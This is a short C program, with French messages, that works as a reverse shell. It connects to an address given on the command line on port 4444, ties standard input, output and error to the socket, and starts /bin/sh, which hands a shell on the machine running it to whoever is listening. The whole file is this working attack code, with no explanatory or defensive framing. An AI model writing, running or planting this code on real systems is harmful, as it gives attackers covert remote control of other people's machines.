#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/time.h>
#define ERROR -1

int main(int ac, char **av)
{
    if (ac != 2)
    {
        printf("Erreur | 1 seul argument nécessaire");
        exit(EXIT_FAILURE);
    }
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in target;

    if (sock == -1)
    {
        printf("ERROR");
        exit(EXIT_FAILURE);
    }

    target.sin_family = AF_INET;
    target.sin_port = htons(4444);
    target.sin_addr.s_addr = inet_addr(av[1]);

    int resultat = connect(sock, (struct sockaddr *)&target, 
                           sizeof(target));

    if (resultat == 0)
    {
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        char *argv[] = {"/bin/sh", NULL};
        execve(argv[0], argv, NULL);
    }

    else if (resultat == -1)
    {
        printf("Connexion echouer...\n");
        exit(EXIT_FAILURE);
    }


}